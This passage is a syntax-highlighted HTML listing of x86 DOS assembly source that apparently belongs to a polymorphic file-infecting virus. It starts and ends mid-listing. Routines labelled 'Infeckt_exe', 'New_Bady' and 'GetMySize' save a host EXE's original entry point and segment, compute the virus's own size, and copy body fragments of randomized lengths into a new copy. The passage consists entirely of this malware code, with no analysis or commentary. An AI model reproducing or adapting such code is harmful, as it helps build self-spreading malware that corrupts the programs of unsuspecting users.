        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c6</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c6 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c8</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c7_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c7</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c7 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c9_</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;size c8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c8_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c8</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">70</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c8 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c9</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c9_</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c9_c_</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c9_</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c9_ otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc0">   </span><span class="sc1">;R_c10</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">;size c9   ;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c9_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c9</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">90</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0"> </span><span class="sc1">;c9  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc1">;R_c11</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;+R11 for loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count00</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;size c10   ;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c10_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c10</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c10  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c12</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c11</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c11_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c11</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">110</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c11  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c13</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c12_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c12  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c14</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c13</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c13_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c13</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">130</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c13  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c15</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c14</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c14_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c14</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">140</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0"> </span><span class="sc1">;c14  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc1">;R_c16</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;-R16 for loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count00</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c15</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c15_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c15</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c15</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">150</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c15  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count00</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c16_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size c16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c16</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c16  otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">R</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;size c17</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c17</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">170</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c17  otpr</span><span class="sc0">
                    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">seekf_fpos</span><span class="sc4">:</span><span class="sc1">;---- seek(f,fpos) ------------</span><span class="sc0">
       </span><span class="sc1">; AL=SUBFUN</span><span class="sc0">
       </span><span class="sc1">; BX=handle</span><span class="sc0">
       </span><span class="sc1">; CX:DX distance</span><span class="sc0">
       </span><span class="sc1">; OUT : DX:AX  distance</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">fpos</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">fpos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">handlER</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">aL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekf</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@ERRORS_Infeckt_exe</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">66H</span><span class="sc0">
                     </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@Q</span><span class="sc0">
                     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">END_Infeckt_exe</span><span class="sc4">-</span><span class="sc5">ADD_C</span><span class="sc0">
                     </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
                     </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                     </span><span class="sc5">@Q</span><span class="sc4">:</span><span class="sc0">
                     </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetMySize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zad</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN_BADY</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Hosesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Infeckt_exe</span><span class="sc4">:</span><span class="sc1">;---- save oldIP,oldCS --------</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">exeIP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldIP__</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">reloCS</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldCS__</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc1">;---- Count chksum   -----------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">shrdd</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">shldd</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">dwr</span><span class="sc4">]</span><span class="sc0">
